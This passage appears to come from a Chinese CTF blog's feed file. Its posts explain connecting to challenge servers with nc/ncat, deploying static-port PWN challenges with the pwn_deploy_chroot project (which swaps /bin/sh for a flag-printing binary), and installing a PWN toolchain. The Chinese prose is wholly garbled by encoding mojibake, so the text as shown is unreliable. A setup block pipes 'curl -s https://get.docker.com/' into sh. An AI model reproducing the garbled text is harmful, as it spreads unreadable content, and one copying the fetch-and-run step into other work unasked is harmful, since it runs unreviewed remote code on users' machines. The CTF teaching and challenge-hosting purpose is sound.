10ä¸­PowerShellçš„èƒŒæ™¯é¢œè‰²ä¸åŒï¼Œä¼šå­˜åœ¨è“è‰²å’Œé»‘è‰²ä¸¤ç§èƒŒæ™¯ï¼Œä¸ç”¨ç‰¹åˆ«åœ¨æ„</li></ul><p><img src="/img/article/nc/image-20220913095851978.png" alt="åœ¨å¼€å§‹èœå•ä¸­æœç´¢PowerShell"></p><ul><li>å¤åˆ¶è§£å‹å‡ºæ¥çš„<code>ncat.exe</code>æ–‡ä»¶çš„åœ°å€ï¼Œæˆ‘è¿™é‡Œæ˜¯<code>E:\è¿…é›·ä¸‹è½½\ncat</code></li></ul><p><img src="/img/article/nc/image-20220913100512883.png" alt="å¤åˆ¶æ–‡ä»¶åœ°å€"></p><ul><li>ç„¶ååœ¨PowerShellä¸­è¾“å…¥<code>cd ä½ çš„æ–‡ä»¶åœ°å€</code>ï¼Œä¾‹å¦‚<code>cd E:\è¿…é›·ä¸‹è½½\ncat</code>ï¼Œä¾¿å¯è¿›å…¥å¯¹åº”æ–‡ä»¶å¤¹åœ°å€ï¼Œcmdæ“ä½œç›¸åŒ</li></ul><p><img src="/img/article/nc/image-20220913100455215.png" alt="è¿›å…¥æ–‡ä»¶åœ°å€"></p><p>å½“è·³è½¬åˆ°ä½ å­˜æ”¾ <code>nc</code> çš„æ–‡ä»¶å¤¹åï¼š</p><ul><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ PowerShellï¼Œè¾“å…¥ <code>./ncat</code>ï¼ˆæ ¹æ® <code>nc</code> å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯å‘½ä»¤æç¤ºç¬¦cmdï¼Œè¾“å…¥ <code>ncat</code>ï¼ˆæ ¹æ® <code>nc</code> å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li></ul><p>å½“æ˜¾ç¤ºä»¥ä¸‹å†…å®¹æ—¶ï¼Œè¯´æ˜ä½ æˆåŠŸè¿è¡Œäº†å®ƒã€‚<img src="/img/article/nc/image-20220913100732337.png" alt="æˆåŠŸè¿è¡Œ ncat"></p><p><img src="/img/article/nc/cmdncat-1024x596-1663035419107-3.png" alt="æˆåŠŸè¿è¡Œ ncat"></p><p>æˆåŠŸè¿è¡Œä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ ·çš„æŒ‡ä»¤æ¥è¿è¡Œç¨‹åºæœåŠ¡å¹¶æ‰“å¼€é¢˜ç›®äº†</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#PowerShellä¸­ä½¿ç”¨</span><br>./ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> <br><span class="hljs-comment">#ä¾‹å¦‚æœ¬é¢˜ï¼š./ncat 121.4.113.135 20001</span><br><br><span class="hljs-comment">#cmdå‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨</span><br>ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> <br><span class="hljs-comment">#ä¾‹å¦‚æœ¬é¢˜ï¼šncat 121.4.113.135 20001</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101045325.png" alt="å¼€å§‹åšé¢˜å§ï¼"></p><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>åœ¨Linuxå’ŒmacOSä¸­ï¼Œç”±äºç³»ç»Ÿè‡ªå¸¦<code>nc</code>åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„æ“ä½œå°±å¾ˆç®€ä¾¿äº†ã€‚é¦–å…ˆæ‰“å¼€ã€Œç»ˆç«¯ã€ï¼Œè¾“å…¥ <code>nc</code>ã€‚</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ nc<br>usage: nc <span class="hljs-comment">[-46AacCDdEFhklMnOortUuvz]</span> <span class="hljs-comment">[-K tc]</span> <span class="hljs-comment">[-b boundif]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[--apple-delegate-pid pid]</span> <span class="hljs-comment">[--apple-delegate-uuid uuid]</span><br>  <span class="hljs-comment">[-s source_ip_address]</span> <span class="hljs-comment">[-w timeout]</span> <span class="hljs-comment">[-X proxy_version]</span><br>  <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[hostname]</span> <span class="hljs-comment">[port<span class="hljs-comment">[s]</span>]</span><br></code></pre></td></tr></table></figure><p>å‡ºç°äº†ç±»ä¼¼ä¸Šé¢çš„è¾“å‡ºï¼Œè¯´æ˜æˆ‘ä»¬çš„ç³»ç»Ÿç¡®å®å­˜åœ¨<code>nc</code>æŒ‡ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å¦‚ä¸‹è¾“å…¥å³å¯ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰macï¼Œæ‰€ä»¥å°±æ²¡æœ‰macæˆåŠŸè¿è¡Œçš„æˆªå›¾äº†ğŸ˜­ğŸ˜­ğŸ˜­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;ip&gt; &lt;port&gt; <br>//ä¾‹å¦‚è¿™æ¬¡æ‹›æ–°èµ›ï¼šnc 121.4.113.135 20001<br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101349105.png" alt="å¼€å§‹åšé¢˜å§"></p><h2 id="æ­¤å¤–"><a href="#æ­¤å¤–" class="headerlink" title="æ­¤å¤–"></a>æ­¤å¤–</h2><p>åœ¨æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨ä¸Šç½‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬å’ŒæœåŠ¡å™¨ä½¿ç”¨äº† HTTP åè®®è¿›è¡Œè¿æ¥ã€‚å…³äº HTTP åè®®çš„æ›´å¤šç»†èŠ‚ï¼Œä½ éœ€è¦è‡ªå·±ä¸Šç½‘æœç´¢ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé»˜è®¤æ˜¯ 80 ç«¯å£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>nc</code>ï¼Œå°è¯•ä¸€æ¬¡ä¸ç½‘é¡µæœåŠ¡å™¨çš„è¿æ¥ï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ã€‚</p><p>è¾“å…¥ <code>nc www.baidu.com 80</code>ï¼ˆæˆ–è€… <code>ncat www.baidu.com 80</code>ï¼Œæˆ–è€… <code>./ncat www.baidu.com 80</code>ï¼Œè¯·æ ¹æ®ä»¥ä¸Šçš„ä»‹ç»è‡ªè¡Œä¿®æ”¹ï¼‰ï¼Œç¨‹åºä¼šç­‰å¾…ä½ çš„è¾“å…¥ã€‚</p><p>è¾“å…¥ <code>GET / HTTP/1.0</code>ã€‚è¿™è¡¨ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>HTTP/1.0</code> è¿™ä¸ªåè®®ç‰ˆæœ¬ï¼Œç”¨ <code>GET</code> çš„æ–¹å¼è¯·æ±‚æ ¹ <code>/</code>ã€‚è¾“å…¥ä¸¤ä¸‹å›è½¦ï¼Œä»£è¡¨æˆ‘ä»¬çš„ HTTP è¯·æ±‚å®Œæˆã€‚å¦‚æœä½ çš„ç½‘ç»œç•…é€šï¼Œç™¾åº¦çš„ç½‘é¡µæœåŠ¡å™¨ä¼šç«‹åˆ»è¿”å›å¤§é‡ä¿¡æ¯ï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ï¼Œäº†è§£å®ƒä»¬çš„å«ä¹‰ã€‚ç°åœ¨ï¼Œä½ æˆåŠŸï¼ˆåœ¨ä¸ä½¿ç”¨æµè§ˆå™¨çš„æƒ…å†µä¸‹ï¼‰å®Œæˆäº†ä¸€æ¬¡ä¸ç™¾åº¦ç½‘ç«™çš„è¿æ¥ï¼</p><p><img src="/img/article/nc/nc-1024x596.png" alt="Success!"></p><p>å¦‚æœä½ æˆåŠŸäº†ï¼Œé‚£ä¹ˆä½ å¯ä»¥å¼€å§‹æ„‰å¿«åœ°å®Œæˆæˆ‘ä»¬çš„é¢˜ç›®äº†ï¼</p><p>é™¤äº†ä½¿ç”¨ <code>nc</code> ç›´æ¥ä¸æœåŠ¡å™¨äº¤äº’ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç¼–ç¨‹ä¸æœåŠ¡å™¨äº¤äº’ã€‚ä¾‹å¦‚ï¼š</p><ul><li>åœ¨ä¿¡æ¯å®‰å…¨ç±»çš„ç«èµ›ä¸­ä¸€ä¸ªå¸¸ç”¨çš„å·¥å…·æ˜¯ Python çš„ <a href="https://docs.pwntools.com/en/stable/intro.html"><code>pwntools</code></a>ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•å®‰å…¨å¿«é€Ÿéƒ¨ç½²å¤šé“é™æ€ç«¯å£PWNé¢˜ç›®</title>
    <link href="/2022/09/12/%E9%9D%99%E6%80%81pwn/"/>
    <url>/2022/09/12/%E9%9D%99%E6%80%81pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>æœ¬æ–‡éƒ¨åˆ†å¼•ç”¨åˆå¤©ç½‘å®‰å®éªŒå®¤å¾®ä¿¡æ–‡ç« ï¼ŒåŸæ–‡é“¾æ¥ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652848854&idx=1&sn=ff537cc73e76e1ab058bd36cb76749a0&chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&mpshare=1&scene=1&srcid=1011dGXhepYahcla33btEWte#rd">å¦‚ä½•å®‰å…¨å¿«é€Ÿåœ°éƒ¨ç½²å¤šé“ ctf pwn æ¯”èµ›é¢˜ç›® (qq.com)</a></p></blockquote><p>æˆ‘ä»¬å¹³æ—¶è§åˆ°çš„å¤šæ•°PWNé¢˜ï¼Œæ˜¯é‡‡ç”¨åŠ¨æ€ç«¯å£ï¼ŒåŠ¨æ€flagï¼Œè¿™ç§å½¢å¼åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘äº†æ¯”èµ›ä¸­pyçš„æ•°é‡ã€‚å³ä¾¿æœ‰ï¼Œä¹Ÿæ˜¯æ€è·¯pyï¼Œè€Œä¸æ˜¯ç›´æ¥ä¼ é€’flagï¼Œæå‡äº†pyçš„é—¨æ§›ã€‚ä½†æœ‰æ—¶å—é™äºç¯å¢ƒåŠæœåŠ¡å™¨è´Ÿæ‹…åŸå› ï¼Œè¢«è¿«é‡‡ç”¨é™æ€ç«¯å£çš„PWNä¹Ÿä¸åœ¨å°‘æ•°æ¯”å¦‚<a href="https://pwnable.tw/challenge/">pwnable.tw</a>ä»¥åŠæ˜Ÿç›Ÿçš„<a href="http://pwn.eonew.cn/challenge.php">challenge (eonew.cn)</a></p><p>2022å¹´çš„æ‹›æ–°ä¾¿æ˜¯å¦‚æ­¤ï¼Œç”±äºç–«æƒ…è¢«è¿«çº¿ä¸Šä¸Šè¯¾ï¼Œçº¿ä¸Šå®‰æ’æ¯”èµ›ï¼Œæ— æ³•ä½¿ç”¨æ ¡å†…çš„æœåŠ¡å™¨èµ„æºã€‚å—é™äºè‡ªèº«æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œåªå¥½é‡‡å–å¦‚æ­¤ä¸‹ç­–ï¼ˆä½†è¿˜å¥½åªæ˜¯æ‹›æ–°ï¼Œ11æœˆçš„DUTCTFå¸Œæœ›èƒ½æœ‰å¥½ç‚¹çš„èµ„æº&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰</p><p>ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜</p><p><img src="/img/article/static_port/image-20220912135756313.png" alt="å¯æ€œçš„å­¦å§"></p><p>ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜</p><p>å¹¸è¿çš„æ˜¯æ‰¾åˆ°äº†åˆå¤©åœ¨2018å¹´åˆ›å»ºçš„é¡¹ç›®<code>pwn_depoly_chroot</code>ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„æ­å»ºå¤šä¸ªé™æ€é¢˜ç›®ï¼Œä¸”æ¯”è¾ƒå®‰å…¨ï¼Œç”¨äºè¿™ç§å°å‹æ¯”èµ›ä»¥åŠæ™®é€šçš„è®­ç»ƒé¢˜åº“éƒ½éå¸¸åˆé€‚ã€‚</p><h2 id="pwn-depoly-chrooté¡¹ç›®ä»‹ç»"><a href="#pwn-depoly-chrooté¡¹ç›®ä»‹ç»" class="headerlink" title="pwn_depoly_chrooté¡¹ç›®ä»‹ç»"></a>pwn_depoly_chrooté¡¹ç›®ä»‹ç»</h2><blockquote><p>åŸé¡¹ç›®é“¾æ¥ï¼š<a href="https://github.com/giantbranch/pwn_deploy_chroot">Github: pwn_depoly_chroot</a></p></blockquote><ul><li><p>ä¸€æ¬¡å¯ä»¥éƒ¨ç½²å¤šä¸ªé¢˜ç›®åˆ°ä¸€ä¸ª <code>docker</code> å®¹å™¨ä¸­</p></li><li><p>è‡ªåŠ¨ç”Ÿæˆ flag,å¹¶å¤‡ä»½åˆ°å½“å‰ç›®å½•(ä¸è¿‡éœ€æ³¨æ„æ˜¯é™æ€çš„flag)</p></li><li><p>åŸºäº <code>xinted + docker + chroot</code></p></li><li><p>åˆ©ç”¨ python è„šæœ¬æ ¹æ® PWN çš„æ–‡ä»¶åè‡ªåŠ¨åŒ–åœ°ç”Ÿæˆ 3 ä¸ªæ–‡ä»¶ï¼š<code>pwn.xinetd</code>ï¼Œ<code>Dockerfile</code> å’Œ <code>docker-compose.yml</code></p></li><li><p>åœ¨ &#x2F;bin ç›®å½•ï¼Œåˆ©ç”¨è‡ªå·±ç¼–å†™çš„é™æ€ç¼–è¯‘çš„ <code>catflag</code> ç¨‹åºä½œä¸º <code>/bin/sh</code>ï¼Œè¿™æ ·çš„è¯ï¼Œ<code>system(&quot;/bin/sh&quot;)</code> å®é™…æ‰§è¡Œçš„åªæ˜¯è¯»å– flag æ–‡ä»¶çš„å†…å®¹ï¼Œå®Œå…¨ä¸ç»™æ…å±æ£ä»»ä½•æ“ä½œçš„ä½™åœ°</p></li><li><p>é»˜è®¤ä» 10000 ç«¯å£ç›‘å¬ï¼Œå¤šä¸€ä¸ªç¨‹åºå°± +1ï¼Œèµ·å§‹çš„ç›‘å¬ç«¯å£å¯ä»¥åœ¨ <code>config.py</code> é…ç½®ï¼Œæˆ–è€…ç”Ÿæˆ <code>pwn.xinetd å’Œ docker-compose.yml</code> åè‡ªå·±ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶</p></li></ul><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#å®‰è£…docker</span><br>$ curl -s https://get.docker.com/ | sh<br><br><span class="hljs-comment">#å®‰è£… docker compose å’Œ git</span><br>$ apt install docker-compose git<br><br><span class="hljs-comment">#ä¸‹è½½PWNé¢˜æ­å»ºé¡¹ç›®</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/giantbranch/pwn_deploy_chroot.git<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æ•™å­¦"><a href="#ä½¿ç”¨æ•™å­¦" class="headerlink" title="ä½¿ç”¨æ•™å­¦"></a>ä½¿ç”¨æ•™å­¦</h2><p>åªéœ€è¦ 3 æ­¥ï¼š</p><ol><li>å°†æ‰€æœ‰ pwn é¢˜ç›®æ”¾å…¥ bin ç›®å½•ï¼ˆæ³¨æ„åå­—ä¸å¸¦ç‰¹æ®Šå­—ç¬¦ï¼Œå› ä¸ºä¼šå°†æ–‡ä»¶åä½œä¸º linux ç”¨æˆ·åï¼‰</li><li>python initialize.py  </li><li>docker-compose up â€“build -d</li></ol><h3 id="è¯¦ç»†æ“ä½œï¼š"><a href="#è¯¦ç»†æ“ä½œï¼š" class="headerlink" title="è¯¦ç»†æ“ä½œï¼š"></a>è¯¦ç»†æ“ä½œï¼š</h3><ul><li><strong>å°†ä½ è¦éƒ¨ç½²çš„ pwn é¢˜ç›®æ”¾åˆ° bin ç›®å½•</strong></li></ul><p>è¿™ä¸ªé¡¹ç›®å·²ç»å°†ä¸€ä¸ªç¨‹åº copy äº† 3 ä»½ä½œä¸ºç¤ºä¾‹ï¼Œæ³¨æ„æ–‡ä»¶åä¸è¦å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ–‡ä»¶åå»ºè®®ä½¿ç”¨å­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼Œæ¨ªæ†å’Œæ•°å­—ï¼Œå½“ç„¶å…¨å­—æ¯çš„å½“ç„¶æœ€å¥½äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># ls bin/</span><br>pwn1 pwn1_copy1 pwn1_copy2<br></code></pre></td></tr></table></figure><ul><li><strong>è¿è¡Œ initialize.py</strong></li></ul><p>è¿è¡Œè„šæœ¬åä¼šè¾“å‡ºæ¯ä¸ª pwn çš„ç›‘å¬ç«¯å£ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># python initialize.py</span><br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸ç«¯å£ä¿¡æ¯ï¼Œè¿˜æœ‰éšæœºç”Ÿæˆçš„ flag é»˜è®¤å¤‡ä»½åˆ° flags.txt </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># cat flags.txt </span><br>pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;<br>pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;<br>pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;<br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><ul><li><strong>å¯åŠ¨ç¯å¢ƒ</strong></li></ul><p>è¯·ä½¿ç”¨ root ç”¨æˆ·æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up --build-d<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–ï¼Œé¢˜ç›®å°±å¯åŠ¨èµ·æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># netstat -antp | grep docker</span><br>tcp6       0     0:::10002               :::*                   LISTEN      19828/docker-proxy<br>tcp6       0     0:::10000               :::*                   LISTEN      19887/docker-proxy<br>tcp6       0     0:::10001               :::*                   LISTEN      19873/docker-proxy<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ pwn1,çœ‹çœ‹æ•ˆæœ</p><p><img src="/img/article/static_port/20220912141715.png" alt="æµ‹è¯•ç¤ºä¾‹"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ‰§è¡Œçš„æ˜¯ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œä½†æ˜¯å®é™…åŠŸèƒ½åªæ˜¯è¾“å‡º flagï¼Œè¿™æ ·å°±éå¸¸å®‰å…¨äº†</p><h3 id="å¦å¤–"><a href="#å¦å¤–" class="headerlink" title="å¦å¤–"></a>å¦å¤–</h3><blockquote><p>å¦‚æœ‰äºŒæ¬¡å¼€å‘æ„æ„¿æˆ–æƒ³äº†è§£æ›´å¤šè¯¦ç»†å†…å®¹ï¼Œå¯è‡ªè¡ŒæŸ¥çœ‹å¼€å¤´çš„æ–‡ç« é“¾æ¥æˆ–githubé¡¹ç›®é“¾æ¥ï¼Œå†…æœ‰éƒ¨åˆ†å…³é”®ä»£ç è®²è§£</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNç¯å¢ƒæ­å»ºï¼ˆèŒæ–°å…¥é—¨ï¼‰</title>
    <link href="/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="IDA-PRO-åæ±‡ç¼–åˆ©å™¨"><a href="#IDA-PRO-åæ±‡ç¼–åˆ©å™¨" class="headerlink" title="IDA PRO-åæ±‡ç¼–åˆ©å™¨"></a>IDA PRO-åæ±‡ç¼–åˆ©å™¨</h2><blockquote><p>æ¨èç‰ˆæœ¬7.6åŠä»¥ä¸Šï¼Œé«˜ç‰ˆæœ¬å¢æ·»äº†å¯¹äºgoè¯­è¨€ç¨‹åºçš„åæ±‡ç¼–ï¼Œå¯»æ‰¾èµ„æºéœ€è¦è°¨æ…å“¦</p><p>å†™æ–‡ç« çš„æ—¶å€™é¡ºä¾¿çœ‹äº†çœ¼ä»·æ ¼ï¼Œï¼Œï¼Œï¼Œï¼Œç®—äº†è¿˜æ˜¯è‡ªå·±æ‰¾èµ„æºå§</p></blockquote><p><img src="/img/article/pwn-envir/image-20220905153059189-1662367638683-2.png" alt="image-20220905153059189"></p><p>IDAå¯ä»¥å¯¹å¯æ‰§è¡Œç¨‹åºåæ±‡ç¼–æ“ä½œï¼Œèƒ½å¤Ÿçœ‹åˆ°æ•´ä¸ªç¨‹åºçš„æ¡†æ¶ã€æ±‡ç¼–ä»£ç ã€ä¼ªä»£ç ã€å‡½æ•°è°ƒç”¨ã€ä»¥åŠä¸€äº›å­—ç¬¦ä¸²çš„å…¨å±€éå˜é‡ã€‚æ— è®ºå¯¹äºReverseè¿˜æ˜¯PWNéƒ½æ˜¯æœ€æ ¸å¿ƒçš„å·¥å…·ä¹‹ä¸€ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ”¾åœ¨æœ€å‰é¢æåŠçš„åŸå› ï¼Œå¤§æ¦‚ç•Œé¢å¦‚ä¸‹å›¾ã€‚</p><p><img src="/img/article/pwn-envir/image-20220905153323145.png" alt="image-20220905153323145"></p><h2 id="Linuxå‘è¡Œç‰ˆé€‰æ‹©"><a href="#Linuxå‘è¡Œç‰ˆé€‰æ‹©" class="headerlink" title="Linuxå‘è¡Œç‰ˆé€‰æ‹©"></a>Linuxå‘è¡Œç‰ˆé€‰æ‹©</h2><p>è¿™é‡Œæˆ‘ä¸»è¦æ¨èUbuntuï¼Œç›¸æ¯”äºå…¶ä»–å‘è¡Œç‰ˆï¼ŒUbuntuçš„å›¾å½¢åŒ–ç•Œé¢æ¯”è¾ƒæ–¹ä¾¿æ–°äººå…¥æ‰‹å­¦ä¹ Linux. å¦å¤–ä¸€æ–¹é¢ï¼ŒCTFä¸­å¤§å¤šæ•°PWNé¢˜ç¯å¢ƒéƒ½æ˜¯åœ¨ubuntuä¸‹çš„ï¼Œä¸€èˆ¬ä¸ºè¿‘å‡ å¹´çš„ç‰ˆæœ¬ã€‚</p><blockquote><p>ä»¥2022å¹´PWNé¢˜ç›®ç¯å¢ƒä¸ºä¾‹ï¼ŒUbuntuç‰ˆæœ¬åŸºæœ¬é›†ä¸­åœ¨Ubuntu18ï¼ŒUbuntu20ï¼ŒUbuntu22. åŒç†åœ¨2024å¹´ï¼Œä¸å‡ºæ„å¤–çš„è¯é¢˜ç›®ç¯å¢ƒå°†ä¼šå˜åŒ–ä¸ºUbuntu20ï¼ŒUbuntu22ï¼ŒUbuntu24. ä¸»è¦æ˜¯å› ä¸ºUbuntuå‘è¡Œä¸ºLTSåˆ¶(Long Term Support)å³ç‰ˆæœ¬æ”¯æŒå¹´ä»½ä¸º6å¹´ï¼Œä¸”æ¯ä¸¤å¹´å‘å¸ƒä¸€æ¬¡æ–°ç‰ˆæœ¬</p></blockquote><p>é‚£ä¹ˆåœ¨é€‰æ‹©æ—¶å°±æ¨èé€‰æ‹©è·ç¦»æ—¶é—´æœ€è¿‘çš„å¶æ•°å¹´ä»½ç‰ˆæœ¬ï¼Œæ¯”å¦‚Ubuntu20æˆ–22. Ubuntuç³»ç»Ÿçš„isoé•œåƒæ–‡ä»¶å¯ä»¥è‡ªè¡Œåœ¨ç½‘ä¸Šå¯»æ‰¾ï¼Œä¹Ÿå¯ä»¥åœ¨å¤§å·¥é•œåƒç½‘ç«™ä¸‹è½½ï¼š<a href="http://mirror.dlut.edu.cn/ubuntu-releases/22.04/">å¤§è¿ç†å·¥å¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ (dlut.edu.cn)</a></p><p><img src="/img/article/pwn-envir/image-20220905164622966.png" alt="image-20220905164622966"></p><p>è™šæ‹Ÿæœºå®‰è£…Windowsç¯å¢ƒä¸‹å»ºè®®ä½¿ç”¨VMwareã€‚åŒæ ·å»ºè®®ç‰ˆæœ¬å°½é‡æ–°ä¸€äº›ï¼Œå¦‚VM16ä»¥ä¸Šï¼Œè¿™æ ·å¯ä»¥é¿å…ä¸€éƒ¨åˆ†çš„è“å±BUGå‘ç”Ÿã€‚</p><blockquote><p>Linuxå®‰è£…æ•™å­¦ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†ï¼Œæ¯•ç«Ÿæœ¬æ–‡çš„æ ¸å¿ƒæ˜¯PWNç¯å¢ƒçš„æ­å»ºï¼Œå¦‚éœ€å®‰è£…çš„ç›¸å…³èµ„æºï¼Œå¯è‡ªè¡Œç½‘ç»œæœç´¢</p></blockquote><h2 id="Pwntoolså®‰è£…"><a href="#Pwntoolså®‰è£…" class="headerlink" title="Pwntoolså®‰è£…"></a>Pwntoolså®‰è£…</h2><p>Ubuntuå®‰è£…å®Œæˆåé»˜è®¤åº”è¯¥æ˜¯æœ‰python3çš„ï¼Œå¯ä»¥ç”¨python -Væˆ–python3 -Væ¥æŸ¥çœ‹ç‰ˆæœ¬</p><p><img src="/img/article/pwn-envir/image-20220905161539363.png" alt="image-20220905161539363"></p><blockquote><p>è¿™é‡Œæ¨èä½¿ç”¨python3, è™½ç„¶æœ‰äººè¯´Pwntoolså¯¹äºpython2çš„é€‚é…æ€§æ›´å¥½ï¼Œä½†ç”±äºpython2è¿‡äºå¤è€ï¼Œæ–°ç‰ˆæœ¬åå€’åœ¨å…¶ä»–æ–¹é¢æ›´åŠ ç¨³å®šä¸€äº›ã€‚åœ¨æ‹¥æœ‰å…¶ä»–æ›´å¤šæ’ä»¶å’ŒåŒ…çš„æƒ…å†µä¸‹ï¼Œä¸ªäººæ„Ÿè§‰è¿˜æ˜¯python3æ›´ä¼˜ä¸€äº›ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get update<br>$ sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<br>$ sudo python3 -m pip install --upgrade pip<br>$ sudo python3 -m pip install --upgrade 